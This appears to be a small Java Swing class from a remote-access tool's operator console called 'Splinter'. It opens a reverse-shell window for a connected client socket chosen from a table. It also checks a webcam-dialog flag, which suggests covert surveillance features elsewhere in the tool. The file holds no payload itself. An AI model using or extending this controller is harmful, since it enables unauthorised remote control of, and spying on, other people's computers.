package GUI.TableUtils.ReverseShell;

import Connections.Streams;
import GUI.SplinterGUI;
import GUI.TableUtils.Configuration.GetSYS;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.Socket;
import java.util.concurrent.ConcurrentHashMap;

public class ReverseShellMenuListener implements ActionListener {
    private final ConcurrentHashMap<Socket, Streams> map;
    private final JTable table;

    private final SplinterGUI mainGUI;

    public ReverseShellMenuListener(JTable table, ConcurrentHashMap<Socket, Streams> map, SplinterGUI mainGUI) {
        this.mainGUI = mainGUI;
        this.map = map;
        this.table = table;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Streams stream = GetSYS.getStream(map, table);
        assert stream != null;
        if (!stream.isWebcamDialogOpen()) new ReverseShellGUI(stream, mainGUI.getMainGUI());
    }
}
